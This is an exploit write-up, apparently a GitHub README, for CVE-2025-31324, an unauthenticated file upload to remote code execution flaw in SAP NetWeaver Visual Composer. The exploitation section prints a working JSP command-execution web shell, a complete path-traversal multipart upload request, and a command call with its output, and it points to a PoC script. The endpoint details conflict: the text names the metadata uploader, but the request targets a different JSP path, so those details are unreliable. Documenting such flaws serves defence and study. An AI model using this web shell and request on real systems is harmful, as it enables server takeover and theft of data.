# CVE-2025-31324 — SAP NetWeaver Visual Composer Unauthenticated File Upload

### Overview
- **CVE ID:** CVE-2025-31324
- **Published:** April 2025
- **Severity (CVSS):** 10.0 (Critical)
- **Affected Software/Versions:** SAP NetWeaver Application Server Java — Visual Composer (`VCFRAMEWORK 7.50`)
- **Vulnerability Type:** Unauthenticated File Upload leading to Remote Code Execution (RCE)

**Summary:**  
This vulnerability arises from a **missing authorization check** in the **metadata uploader** component of SAP NetWeaver Visual Composer.  
An unauthenticated attacker can send a crafted HTTP request to upload arbitrary files (such as **JSP web shells**) into a web-accessible directory.  

Once uploaded, these files can be directly requested via a browser or tool like `curl`, resulting in **execution of attacker-controlled code** on the SAP server.  

This is a **pre-auth, single-request RCE** with a CVSS 10.0 rating — one of the most critical categories possible.

---

### Context
To understand why this vulnerability is so dangerous, let’s break down **what Visual Composer does** and **how the bug fits into the bigger picture**:

- **Visual Composer** is a design-time tool inside SAP NetWeaver used for creating UI components and applications.  
- It includes an **endpoint called the metadata uploader** (`/developmentserver/metadatauploader`) that handles uploading XML or other artifacts for Visual Composer projects.  
- **The Problem:** This uploader endpoint **does not enforce authentication or authorization**.  
- **The Result:** Any unauthenticated attacker can POST arbitrary files to the server.  
- Because the files are placed into **web-served directories**, attackers can upload **JSP scripts** and then access them over HTTP to execute arbitrary code.

This is effectively the holy grail of web exploitation: **unauthenticated arbitrary file upload + immediate code execution**.

---

### Root Cause
The vulnerability boils down to **missing authorization checks** on the upload functionality.

- The **metadata uploader** simply accepts a file from an HTTP POST request.  
- It writes the file into a directory that the Java application server later **treats as executable content**.  
- No validation of file type, no verification of the requester, no restrictions.

---

### Exploitation (Step-by-Step)

#### 1. Locate the Vulnerable Endpoint

Attackers scan for SAP NetWeaver systems exposing endpoints like:
```
https://victim.sap.local/VC/Auth/VC_Auth.jsp
```
Other observed vulnerable endpoints include `/irj/portal/sap/bc/webdynpro/sap/ZWDC_METADATA_UPLDR`.
_The exact path varies by configuration_, but any exposed Visual Composer uploader is suspect.

#### 2. Craft the Malicious Upload
The attacker prepares a **malicious JSP web shell**.
For example, a simple command execution backdoor:
```jsp
<%@ page import="java.util.*,java.io.*"%>
<% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); new java.io.InputStreamReader(p.getInputStream()).transferTo(out); } %>
```
They then send a `POST` request with this payload:
```http
POST /VC/Auth/VC_Auth.jsp HTTP/1.1
Host: victim.sap.local
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="FILENAME"

../../../../../../../../../apps/sap.com/vc~wd~ext/servlet_jsp/VC/root/shell.jsp
------BOUNDARY
Content-Disposition: form-data; name="zip"; filename="payload.zip"
Content-Type: application/octet-stream

<Binary content of the ZIP archive containing the JSP shell goes here>
------BOUNDARY--
```
#### 3. Access the Uploaded File
Once uploaded, the file is accessible under a web-served path, such as:
```
https://victim.sap.local/VC/root/shell.jsp
```
The attacker can now execute commands via HTTP:
```
https://victim.sap.local/VC/root/shell.jsp?cmd=whoami
```
Typical output:
```
sidadm
```
This confirms **remote code execution** as the SAP application server account.

---

### Post Exploitation
With arbitrary code execution, attackers can:

* Deploy persistent backdoors or reverse shells.
* Dump credentials or pivot inside the SAP landscape.
* Chain with other vulnerabilities (e.g. deserialization) for stealthier, fileless execution.

Reports confirm **active exploitation in the wild** since April 2025, with attackers dropping JSP shells named `helper.jsp`, `cache.jsp`, and similar.
CISA added this CVE to the **Known Exploited Vulnerabilities (KEV) catalog** on April 29, 2025.

---
### Proof of Concept

A **minimal educational PoC script** is provided in:
[`poc/exploit.py`](poc/exploit.py) <br>
It demonstrates:
- Crafting an in-memory ZIP archive containing the JSP payload.
- Sending a multipart POST request with the path traversal payload in the FILENAME form field.
- Confirming the upload by providing the final URL for the web shell.
> ⚠️ Note: The provided PoC is for controlled lab environments only.

---
### Lessons Learned

1. **Uploaders are high-value targets.** Any upload functionality with missing auth is a potential RCE.
2. **Web shells remain effective.** Despite modern defenses, JSP/PHP/ASP uploads are still highly reliable.
3. **Pre-auth bugs are catastrophic.** No authentication + direct RCE = maximum severity.
4. **Chaining is common.** Attackers often pair file upload with deserialization or SSRF to expand control.
5. **Operational awareness.** Attackers who find these endpoints will often use common naming patterns and blending techniques to hide in plain sight.

---
### References

* [Unit 42 Threat Brief: SAP NetWeaver CVE-2025-31324](https://unit42.paloaltonetworks.com/threat-brief-sap-netweaver-cve-2025-31324/)
* [CISA KEV Catalog Entry (CVE-2025-31324)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
* [CVE Details Entry](https://www.cvedetails.com/cve/CVE-2025-31324/)
* [Infosecurity Magazine: Exploit Released](https://www.infosecurity-magazine.com/news/sap-netweaver-flaw-exploit-released/)
* [WithSecure Labs: Attack Observations](https://labs.withsecure.com/publications/netweaver-cve-2025-31324)
